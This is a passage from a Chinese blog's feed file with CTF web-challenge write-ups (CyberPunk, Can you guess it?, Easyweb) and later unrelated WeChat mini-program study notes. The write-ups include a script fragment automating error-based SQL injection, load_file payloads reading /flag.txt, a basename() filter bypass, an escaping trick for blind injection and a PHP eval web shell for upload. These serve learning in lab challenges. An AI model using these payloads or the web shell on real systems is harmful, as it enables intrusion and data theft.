punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span>    kk <span class="token operator">=</span> r<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url_change<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'XPATH'</span> <span class="token keyword">in</span> kk<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>kk<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    <span class="token comment">#正序</span>    <span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + suf</span>    <span class="token comment">#逆序</span>    paylaod <span class="token operator">=</span> pre <span class="token operator">+</span> <span class="token string">"||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('"</span> <span class="token operator">+</span> i <span class="token operator">+</span> suf    register<span class="token punctuation">(</span>paylaod<span class="token punctuation">)</span>    login<span class="token punctuation">(</span>paylaod<span class="token punctuation">)</span>    changepwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#正序payload</span><span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "'))),1))#"</span><span class="token comment">#逆序payload</span><span class="token comment">#paylaod = pre + "||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp('" + i + "')))),1))#"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 错显 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 华北赛区 Day1 Web5]CyberPunk</title>
      <link href="/p/2589587575.html"/>
      <url>/p/2589587575.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[cyberpunk|2077]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web5-CyberPunk/image-20210705163753559.png"></p><p>又是一道一年前做过的题，翻了翻当时的笔记，折腾了很久，没做出来。</p><p>看了看wp，才知道flag在/flag.txt下面，之前一直在用错显爆数据库</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="1-文件包含"><a href="#1-文件包含" class="headerlink" title="1.文件包含"></a>1.文件包含</h3><p>首先在注释里发现<code>&lt;!--?file=?--&gt;</code>，文件包含下，加上伪协议，把几个文件源码爆出来，慢慢看。</p><p>过滤的很死，但在change.php里没有对address进行正则检测，sql语句里还对<code>旧address</code>进行查询，所以漏洞就出在这。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"update `user` set `address`='"</span> <span class="token operator">.</span> <span class="token variable">$address</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"', `old_address`='"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'address'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"' where `user_id`="</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>逻辑梳理：address打入注入代码=&gt;第二次正常运行触发注入代码</p><h3 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="2.SQL注入"></a>2.SQL注入</h3><p>因为有<code> print_r($db-&gt;error);</code>,所以错显读取flag，至于怎么知道flag在/flag.txt，暂时不明</p><p>payload：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&amp;</span>address<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">&amp;</span>address<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and updatexml(1,concat(0x7e,(select substr(load_file('</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt'<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>一个账户执行执行一个payload，因为之前打入的注入代码破坏了正常逻辑，导致无法正常更新数据，所以注入代码就一直是同一句。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> 错显 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[Zer0pts2020]Can you guess it?</title>
      <link href="/p/2231722754.html"/>
      <url>/p/2231722754.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词：[guess|basename|正则]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Zer0pts2020-Can-you-guess-it/image-20210705134313605.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$guess</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'guess'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token variable">$guess</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Congratulations! The flag is: '</span> <span class="token operator">.</span> <span class="token constant">FLAG</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$message</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Wrong.'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题难，我整不来。</p><p>翻翻wp，才知道随机数那是个陷阱。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="basename-函数漏洞"><a href="#basename-函数漏洞" class="headerlink" title="basename()函数漏洞"></a>basename()函数漏洞</h3><h4 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">basename</span><span class="token punctuation">(</span><span class="token operator">/</span>index<span class="token operator">.</span>php<span class="token operator">/</span>config<span class="token operator">.</span>php<span class="token punctuation">)</span> <span class="token operator">=></span>返回config<span class="token operator">.</span>php，但访问的还是index<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有正则，就可以<code>/index.php/config.php?source</code>来读取flag：访问的index.php，显示的确实config.php内容。</p><p>所以接下来要考虑绕过正则。</p><h4 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h4><p><code>basename()</code>去掉文件名开头的非ASCII值:<a href="https://bugs.php.net/bug.php?id=62119">https://bugs.php.net/bug.php?id=62119</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xffconfig.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// => config.php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php/xff"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// => config.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是构造payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">/</span>config<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">%</span>ff<span class="token operator">?</span>source<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样的话，理下逻辑：</p><p><code>$_SERVER[&#39;PHP_SELF&#39;]</code>=<code>index.php/config.php/�</code>，绕过了正则。</p><p><code>basename</code>函数返回值=<code>config.php</code>，访问的还是index.php，读的是config.php。</p><p>结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHP代码审计 </tag>
            
            <tag> basename </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[CISCN2019 总决赛 Day2 Web1]Easyweb</title>
      <link href="/p/1768082624.html"/>
      <url>/p/1768082624.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>着实惭愧，这题一年前还做过，今天再做，得，忘得一干二净。</p><p>写好的脚本一打开，payload都是原封不动了，尴尬。</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1/image-20210704234624409.png"></p><p>截个图，写个关键字，方便日后检索：[猫图|猫头|猫猫]</p><p>这题主要三个考点：1.备份文件泄漏；2.SQL盲注；3.文件上传</p><h3 id="1-备份文件泄漏"><a href="#1-备份文件泄漏" class="headerlink" title="1.备份文件泄漏"></a>1.备份文件泄漏</h3><p>扫下目录，有robots.txt</p><p>提示是*.php.bak</p><p>扫到是/image.php.bak</p><h3 id="2-SQL盲注"><a href="#2-SQL盲注" class="headerlink" title="2.SQL盲注"></a>2.SQL盲注</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>像这种单引号+转义单引号都被过滤，然后又有过滤其他字符情况下。可以考虑套娃转义。<br>比如<code>\0</code>被输入到字符串中，<code>addslashes()</code>添加反斜杠变成<code>\\0</code>,又会被<code>str_replace()</code>转义成<code>\</code>，这样就构造成<code>\&#39;</code>，就能把单引号转义了。</p><p>注意，在输入的时候还得把<code>\0</code>转义，所以是<code>?id=\\0</code></p><p>这样看太抽象，我还琢磨了好久，扔到navicat一下就明白了。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-Easyweb-CISCN2019-%E6%80%BB%E5%86%B3%E8%B5%9B-Day2-Web1/image-20210705000044013.png"></p><p>然后测试一波payload,搞清楚盲注逻辑，套到脚本里跑，拿到admin的密码(无需解md5。这题不知道为什么跑起来真的慢</p><h3 id="3-文件上传"><a href="#3-文件上传" class="headerlink" title="3.文件上传"></a>3.文件上传</h3><p>漏洞在文件名处，会将文件名写入到log.php里，又因为检测php字符串，所以一句话木马用短标签</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> if+substr盲注 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记</title>
      <link href="/p/4251616546.html"/>
      <url>/p/4251616546.html</url>
      
        <content type="html"><![CDATA[<h2 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h2><ul><li><p>数据驱动<br>将差异应用到Dom树上，达到更新UI的目的，意味着只有“修改”的相关属性才会刷新，而没有变化的就不动，避免了小部分字节修改导致全局页面都得刷新一遍的情况。</p></li><li><p>onLoad=&gt;onShow=&gt;onReady。</p></li><li><p>不要把data中的任意一项的value设为undefined，否则可能会有引起一些不可预料的bug</p></li><li><p>currentTarget为当前事件所绑定的组件，而target则是触发该事件的源头组件</p></li><li><p>事件触发顺序:handleTap2、handleTap4、handleTap3、handleTap1<br>先捕获(从外到内)，后冒泡(从内到外<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210206182851994_22689.png"></p><blockquote><p>bind事件绑定不会阻止冒泡事件向上冒泡，catch事件绑定可以阻止冒泡事件向上冒泡。如果将上面代码中的第一个capture-bind改为capture-catch，将只触发handleTap2(capture-catch将中断捕获阶段和取消冒泡阶段)</p></blockquote><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span>  <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>outer<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap1<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">capture-bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  outer view  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>view</span>    <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>inner<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap3<span class="token punctuation">"</span></span>    <span class="token attr-name"><span class="token namespace">capture-bind:</span>touchstart</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>handleTap4<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span>    inner view  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>view</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>hover-class属性可改变触摸时的样式</p></li><li><p>为防止用户极快速度触发两次tap回调，可设个变量如hasClick当作状态锁</p></li><li><p>预先展示的，如广告、导航栏、大体框架可利用<strong>初始渲染缓存</strong></p></li><li><p><strong>双向绑定</strong><br><code>&lt;input model:value=&quot;&#123;&#123;value&#125;&#125;&quot; /&gt;</code>页面修改了值后台也会改，可以减少绑定form传值问题了。</p><h2 id="值得注意的小问题"><a href="#值得注意的小问题" class="headerlink" title="值得注意的小问题"></a>值得注意的小问题</h2></li></ul><h3 id="块级标签和内联标签"><a href="#块级标签和内联标签" class="headerlink" title="块级标签和内联标签"></a>块级标签和内联标签</h3><ul><li>块级标签-行元素<blockquote><p>自带换行<br><code>&lt;h1-h6&gt;&lt;/h1-h6&gt;，&lt;p&gt;&lt;/p&gt;，&lt;div&gt;&lt;/div&gt;</code></p></blockquote></li><li>内联标签-内联标签<blockquote><p>处于一行<br><code>&lt;span&gt;&lt;/span&gt;，&lt;a&gt;&lt;/a&gt;，&lt;img/&gt;</code></p></blockquote></li></ul><p>1.上下边距设置无效<br>2.没有宽度和高度<br>3.不会占据多余面积<br>4.img标签和块级标签一样，有边距和宽高！所以img标签又叫行内块级标签</p><ul><li><p>text-align对于行内元素和行内块级元素可能无效<br>原因是:行内元素没有宽高，行内元素的宽高全部来自于内容的长度和高度。<br>行内块级元素默认也是没有设置宽高，但是行内块级元素可以设置宽度和高度。一旦设置了宽高以后，只要有剩余空间就可以看到对齐方式的效果。</p></li><li><p>四种display显示模式</p><blockquote><ol><li>block，以块状标签进行显示</li><li>inline，以内联标签进行显示</li><li>inline-block，以块状内联标签进行显示 ，类似图片这样的，一行可以有多个，同时具有宽高，内外边距。</li><li>none，以隐藏标签进行显示[隐藏起来的标签]，类似<input type="hidden" >。</li></ol></blockquote></li></ul><hr><h3 id="杂项备注"><a href="#杂项备注" class="headerlink" title="杂项备注"></a>杂项备注</h3><p>iPhone6: 1rpx = 0.5px<br>微信小程序：1rem=32rpx<br>web页面1rem=小程序1.25rem=40rpx，1rem=32rpx<br>wx:for-item=”page” 遍历数组重命名<br>wx:for-items=”“ wx:for-item=”post” 也可以这样<br>wx:key更重要的一个作用是保持渲染元素的状态不丢失，例如渲染的switch被选中后，数组发生改变重新渲染，选中状态不丢失。</p><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20201206202215441_1461.png"><br>这占位符字体大小，变大后，会稍稍往下缩一点，反正多调，就能调到光标和占位符符合的大小。<br>如果两个字体值相同，那占位符会比输入字体高一点。<br>就离谱，折腾半天不知道这玩意到底怎么回事，姑且这么记着吧。</p><p>一些值不能不设，不设置和0结果是不一样的。比如bottom right这种</p><p>bottom里的view class无效<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20201208195533406_13794.png"></p><h3 id="判断数据类型"><a href="#判断数据类型" class="headerlink" title="判断数据类型"></a>判断数据类型</h3><p>注意，JavaScript一切数据皆对象，所以typeof没用<br>console.log(post[i][“comment”] instanceof Array);</p><h3 id="wx-for"><a href="#wx-for" class="headerlink" title="wx:for"></a>wx:for</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html">wx:for="&#123;&#123;navbarTitle&#125;&#125;" wx:key="index"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>index是下标，item是值</p><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><p>修改v，可以直接修改原数组<br>array.forEach((v,i)=&gt;i===index?v.isActive=true);</p><h3 id="class里的"><a href="#class里的" class="headerlink" title="class里的."></a>class里的.</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210121204349121_29437.png"><br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210121204401620_21780.png"><br>类似这样，加个disabled就能切换图标</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.detail_serve_item</span> <span class="token punctuation">&#123;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 6rpx 24rpx 6rpx 0<span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">line-height</span><span class="token punctuation">:</span> 1<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> #8c8c8c<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.detail_serve_item::before</span> <span class="token punctuation">&#123;</span>    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>    <span class="token property">vertical-align</span><span class="token punctuation">:</span> middle<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> -4rpx<span class="token punctuation">;</span>    <span class="token property">margin-right</span><span class="token punctuation">:</span> 12rpx<span class="token punctuation">;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 22rpx<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 22rpx<span class="token punctuation">;</span>    <span class="token property">background</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span>    <span class="token property">background-repeat</span><span class="token punctuation">:</span> no-repeat<span class="token punctuation">;</span>    <span class="token property">background-size</span><span class="token punctuation">:</span> 22rpx auto<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token selector">.detail_serve_item.disabled::before</span> <span class="token punctuation">&#123;</span><span class="token comment">/*同时包含detail_serve_item和disabled*/</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，写成<code>.disabled.detail_serve_item</code>也是可以的，他们两者并没有什么优先级</p><h3 id="line-height-与font-size"><a href="#line-height-与font-size" class="headerlink" title="line-height 与font-size"></a>line-height 与font-size</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210122150337571_384.png"></p><h3 id="data-大小写问题"><a href="#data-大小写问题" class="headerlink" title="data- 大小写问题"></a>data- 大小写问题</h3><p>data-navbarindex=”“ =》navbarindex<br>data-navbarIndex=”“ =》navbarindex<br>data-navbar-index=”“ =》navbarIndex<br>data-navbar-Index=”“ =》navbarIndex</p><h3 id="background问题"><a href="#background问题" class="headerlink" title="background问题"></a>background问题</h3><ul><li>background-image和background-size 要写一起<br>写分支的时候，size要写到分支里而不能写主干，可能是因为有图片才能控制大小，在图片还没有的时候大小无法掌控<br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210123124518036_4430.png"></li></ul><h3 id="forEach里读不到数据不报错"><a href="#forEach里读不到数据不报错" class="headerlink" title="forEach里读不到数据不报错"></a>forEach里读不到数据不报错</h3><p>这样报错：<code>arr.push(&#123;abc:res.data.data.adfadfasdfasdf&#125;)</code><br>这样不报错：</p><pre class="line-numbers language-none"><code class="language-none">res.data.data.forEach((i) &#x3D;&gt; &#123;   arr.push(&#123;abc: i.asdfasdfasdfsd,&#125;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="wxs保留小数问题"><a href="#wxs保留小数问题" class="headerlink" title="wxs保留小数问题"></a>wxs保留小数问题</h3><p><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210126161250329_8788.png"><br><img src="/../images/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20210126161304458_8462.png"><br>无语。。。。。。</p><h3 id="保留整数问题"><a href="#保留整数问题" class="headerlink" title="保留整数问题"></a>保留整数问题</h3><p><code>&#123;&#123;price|int&#125;&#125;</code></p><h3 id="redirectTo-navigateTo-switchTap-区别"><a href="#redirectTo-navigateTo-switchTap-区别" class="headerlink" title="redirectTo/navigateTo/switchTap 区别"></a>redirectTo/navigateTo/switchTap 区别</h3><blockquote><p>redirectTo：关闭当前页(卸载)，跳转到指定页<br>navigateTo：保留当前页(隐藏)，跳转到指定页<br>switchTap：只能用于跳转到tabbar页面，并关闭其他非tabbar页面,tabbar之间做切换</p></blockquote><h3 id="then-避免数据没等到情况"><a href="#then-避免数据没等到情况" class="headerlink" title=".then()避免数据没等到情况"></a>.then()避免数据没等到情况</h3><p>.then()前的方法执行完后再执行then()内部的程序，这样就避免了，数据没获取到等的问题。</p><h3 id="input和占位符居中问题"><a href="#input和占位符居中问题" class="headerlink" title="input和占位符居中问题"></a>input和占位符居中问题</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token property">height</span><span class="token punctuation">:</span> auto<span class="token punctuation">;</span><span class="token property">font-size</span><span class="token punctuation">:</span> 32rpx<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>主要就是height改一改，改成auto省时省力。</p><h3 id="get发包里的data问题"><a href="#get发包里的data问题" class="headerlink" 